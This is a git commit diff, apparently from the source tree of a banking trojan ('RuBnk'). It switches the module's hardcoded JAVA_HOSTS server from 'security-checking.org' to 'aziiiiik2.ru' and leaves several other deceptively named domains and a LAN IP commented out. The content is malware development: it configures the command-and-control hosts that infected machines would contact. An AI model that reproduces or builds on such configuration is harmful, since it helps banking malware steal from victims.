c9c7f00d3985f643dc5ae5be4c83d1ad0448e12d
Igor@RIVSOFT <rivsoft1975@mail.ru>
2013-01-21 12:33:39 +0200

    -

--- source/RuBnk/JavaConfig.cpp
+++ source/RuBnk/JavaConfig.cpp
@@ -35,9 +35,9 @@
 //							"ibasystemdbaodomen.org\0"
 //							"\0";
 
-//		char JAVA_HOSTS[] = "ibanksec.com\0";
+		char JAVA_HOSTS[] = "aziiiiik2.ru\0";
 //		char JAVA_HOSTS[] = "az2.zika.in\0";
-		char JAVA_HOSTS[] = "security-checking.org\0";
+//		char JAVA_HOSTS[] = "security-checking.org\0";
 //		char JAVA_HOSTS[] = "192.168.0.250\0";
 
 	#endif
